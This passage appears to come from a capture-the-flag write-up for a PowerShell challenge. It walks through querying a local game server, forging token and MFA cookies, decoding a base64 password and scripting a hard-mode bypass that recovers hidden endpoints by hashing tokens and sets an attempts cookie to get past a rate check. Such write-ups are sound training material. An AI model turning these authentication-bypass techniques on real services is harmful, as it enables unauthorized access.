\n8d4366f08c013f5c0c587b8508b48b15,REDACTED\n67566692ca644ddf9c1344415972fba8,REDACTED\n8fbf4152f89b7e309e89b9f7080c7230,REDACTED\n936f4db24a290032c954073b3913f444,REDACTED\nc44d8d6b03dcd4b6bf7cb53db4afdca6,REDACTED\ncb722d0b55805cd6feffc22a9f68177d,REDACTED\n724d494386f8ef9141da991926b14f9b,REDACTED\n67c7aef0d5d3e97ad2488babd2f4c749,REDACTED\n5f8dd236f862f4507835b0e418907ffc,4216B4FAF4391EE4D3E0EC53A372B2F24876ED5D124FE08E227F84D687A7E06C\n# [*] SYSTEMLOG\n# [*] Defence mechanisms activated, REDACTING endpoints, starting with sensitive endpoints\n# [-] ERROR, memory corruption, not all endpoints have been REDACTED\n# [*] Verification endpoint still active\n# [*] http://127.0.0.1:1225/tokens/&lt;sha256sum&gt;\n# [*] Contact system administrator to unlock panic mode\n# [*] Site functionality at minimum to keep weapons active\n</code></pre> <p>8) Luckily the defense mechanisms were faulty! There seems to be one api-endpoint that still isn't redacted! Communicate with that endpoint!</p> <pre><code>PS /home/user&gt; (Invoke-WebRequest http://127.0.0.1:1225/tokens/4216B4FAF4391EE4D3E0EC53A372B2F24876ED5D124FE08E227F84D687A7E06C -Credential $credentials -AllowUnencryptedAuthentication).Content\n&lt;h1&gt;[!] ERROR: Missing Cookie 'token'&lt;/h1&gt; \n</code></pre> <p>9) It looks like it requires a cookie token, set the cookie and try again.</p> <pre><code>PS /home/user&gt; $headers = @{ \"Cookie\" = \"token=5f8dd236f862f4507835b0e418907ffc\" }                              \nPS /home/user&gt; (Invoke-WebRequest http://127.0.0.1:1225/tokens/4216B4FAF4391EE4D3E0EC53A372B2F24876ED5D124FE08E227F84D687A7E06C -Credential $credentials -AllowUnencryptedAuthentication -Headers $headers).Content       \n&lt;h1&gt;Cookie 'mfa_code', use it at &lt;a href='1732289347.8861198'&gt;/mfa_validate/4216B4FAF4391EE4D3E0EC53A372B2F24876ED5D124FE08E227F84D687A7E06C&lt;/a&gt;&lt;/h1&gt;\n</code></pre> <p>10) Sweet we got a MFA token! We might be able to get access to the system. Validate that token at the endpoint!</p> <pre><code>PS /home/user&gt;  &amp;   {     \n    $webrequest = Invoke-WebRequest http://127.0.0.1:1225/tokens/4216B4FAF4391EE4D3E0EC53A372B2F24876ED5D124FE08E227F84D687A7E06C -Credential $credentials -AllowUnencryptedAuthentication -Headers $headers;\n    $href = $webrequest.Links[0].href;\n    $cookie = \"token=5f8dd236f862f4507835b0e418907ffc; mfa_token=\" + $href;\n    $headers = @{ \"Cookie\" = $Cookie };\n    $webrequest = Invoke-WebRequest http://127.0.0.1:1225/mfa_validate/4216B4FAF4391EE4D3E0EC53A372B2F24876ED5D124FE08E227F84D687A7E06C -Credential $credentials -AllowUnencryptedAuthentication -Headers $headers; $webrequest.Content;\n}\n&lt;h1&gt;[+] Success&lt;/h1&gt;&lt;br&gt;&lt;p&gt;Q29ycmVjdCBUb2tlbiBzdXBwbGllZCwgeW91IGFyZSBncmFudGVkIGFjY2VzcyB0byB0aGUgc25vdyBjYW5ub24gdGVybWluYWwuIEhlcmUgaXMgeW91ciBwZXJzb25hbCBwYXNzd29yZCBmb3IgYWNjZXNzOiBTbm93TGVvcGFyZDJSZWFkeUZvckFjdGlvbg==&lt;/p&gt;\n</code></pre> <p>11) That looks like base64! Decode it so we can get the final secret!</p> <pre><code>PS /home/user&gt; $base64String = \"Q29ycmVjdCBUb2tlbiBzdXBwbGllZCwgeW91IGFyZSBncmFudGVkIGFjY2VzcyB0byB0aGUgc25vdyBjYW5ub24gdGVybWluYWwuIEhlcmUgaXMgeW91ciBwZXJzb25hbCBwYXNzd29yZCBmb3IgYWNjZXNzOiBTbm93TGVvcGFyZDJSZWFkeUZvckFjdGlvbg==\" \nPS /home/user&gt; [System.Text.Encoding]::UTF8.GetString( [System.Convert]::FromBase64String($base64String))\nCorrect Token supplied, you are granted access to the snow cannon terminal. Here is your personal password for access: SnowLeopard2ReadyForAction\n</code></pre> <p>Success! We got the Silver Trophy</p> <p>Alabaster can now access their weaponry and put a stop to it. Once HHC grants your achievement, you can close this terminal.</p> Piney Sappington <p>Fantastic work! You've navigated PowerShell\u2019s tricky waters and retrieved the codeword\u2014just what we need in these uncertain times. You're proving yourself a real asset!</p> <p>I'll let you in on a little secret\u2014there\u2019s a way to bypass the usual path and write your own PowerShell script to complete the challenge. Think you're up for it? I know you are!</p>"},{"location":"objectives/o9/#hard-mode","title":"Hard Mode","text":"<p>Once the easy mode is completed, we are provided with some imporant hints. The first one explains that the endpoints are generated by running the token into a SHA256 algorithm. This means that we can recover the redacted endpoints. So I start my script by requesting the token_over file, parse it to get just the tokens and then start looping on each token. Each Token is saved to a file on which we can run the suggested Get-FileHash method, and this returns the endpoint. Next step is to connect to the tokens endpoint to retreive the mfa_token, that is only valid for two seconds, and then proceed with sending that to the mfa_validate endpoint. At this stage, we start hitting an error saying \"Setting cookie attempts\", and this is where the hint referring to the threshold of the number of attempts shows its importance. The tokens endpoint also gives us the following hint:</p> <pre><code>&lt;p&gt;Possible unauthorized access detected.&lt;br&gt;Endpoints have been scrambled.&lt;br&gt;Basic token evasion tactics implemented, fakeout threshold set to 10.&lt;br&gt;Default token validity set to 2 seconds.&lt;/p&gt;\n</code></pre> <p>With this noted, we try adding a cookie call attempts with a value of 10 (or higher), and executing this code, wins the challenge.</p> <pre><code>$credentials = Get-Credential \n\n&amp; {\n    # Get Tokens with Redacted Endpoints\n    $webRequest = (Invoke-WebRequest http://127.0.0.1:1225/token_overview.csv -Credential $credentials -AllowUnencryptedAuthentication)\n    $filteredLines = $webRequest.Content -split \"`n\" | Where-Object { $_ -match \",REDACTED\" }\n    $processedLines = $filteredLines | ForEach-Object { $_ -replace \",REDACTED\", \"\" }\n\n    foreach ($line in $processedLines) {\n        Write-Output \"&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;\"\n        $line = $line.Trim()\n\n        $tempFilePath = [System.IO.Path]::GetTempFileName()     \n        Set-Content -Path $tempFilePath -Value $line    \n        $fileHash = Get-FileHash -Path $tempFilePath -Algorithm SHA256      \n        Remove-Item -Path $tempFilePath     \n\n        $cookie = \"token=\" + $line              \n        $headers = @{ \"Cookie\" =  $cookie}\n        $url = \"http://127.0.0.1:1225/tokens/\" + $fileHash.hash     \n        $webRequest = Invoke-WebRequest $url -Credential $credentials -AllowUnencryptedAuthentication -Headers $headers\n        # Write-Output $webRequest.Content\n\n        $href = $webRequest.Links[0].href;\n        $cookie = \"attempts=10; token=\" + $line +\"; mfa_token=\" + $href;        \n        $headers = @{ \"Cookie\" =  $cookie}\n        $url = \"http://127.0.0.1:1225/mfa_validate/\" + $fileHash.Hash\n        $webRequest = Invoke-WebRequest $url -Credential $credentials -AllowUnencryptedAuthentication -Headers $headers;\n\n        Write-Output \"Token: $line\"\n        Write-Output \"Hash: $($fileHash.Hash)\"\n        if ($webRequest.Content -match \"\\[\\-\\]\") {\n            Write-Output \"Failed to Bypass Security Measures on this Endpoint.\"         \n            # Write-Output $webRequest.Content\n        }\n        elseif ($webRequest.Content -match \"\\[\\*\\]\") {        \n            Write-Output \"attempts cookie has not been set.\"            \n            break\n        }\n        elseif ($webRequest.Content -match \"\\[\\+\\]\") {        \n            Write-Output $webRequest.Content\n            break\n        }\n        else {\n            Write-Output $webRequest.Content\n            Write-Output \"Something unexpected happened. Exiting...\"            \n            break\n        }       \n    }\n}\n</code></pre> <p>Success, defense mechanisms deactivated.</p> <p>Administrator Token supplied, You are able to control the production and deployment of the snow cannons. May the best elves win: WombleysProductionLineShallPrevail</p>"},{"location":"objectives/o9/#response","title":"Response","text":"<p>Piney Sappington</p> <p>Incredible! You tackled the hard path and showed off some serious PowerShell expertise. This kind of skill is exactly what we need, especially with things heating up between the factions.</p> <p>Well done! you've demonstrated solid PowerShell skills and completed the challenge, giving us a bit of an edge. Your persistence and mastery are exactly what we need\u2014keep up the great work!</p>"}]}